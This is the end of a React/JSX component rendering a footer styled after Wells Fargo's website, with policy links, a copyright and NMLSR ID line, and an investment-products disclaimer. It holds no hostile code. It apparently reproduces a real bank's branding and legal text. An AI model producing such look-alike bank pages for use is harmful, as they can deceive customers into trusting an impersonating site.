            <div className="flex justify-between items-center text-xs text-gray-500 mb-4">
              <div className="flex gap-4">
                <span className="hover:text-[#d71e28] cursor-pointer">Privacy Policy</span>
                <span className="hover:text-[#d71e28] cursor-pointer">Terms of Use</span>
                <span className="hover:text-[#d71e28] cursor-pointer">Report Fraud</span>
                <span className="hover:text-[#d71e28] cursor-pointer">Security</span>
                <span className="hover:text-[#d71e28] cursor-pointer">Accessibility</span>
              </div>
              <div>© 2026 Wells Fargo. All rights reserved. NMLSR ID 399801</div>
            </div>
            <p className="text-xs text-gray-400">
              Investment and Insurance Products are: Not Insured by the FDIC or Any Federal Government Agency • Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate • Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested
            </p>
          </div>
        </footer>
      </div>

      {/* Mobile Layout */}
      <MobileLayout />
    </>
  );
}
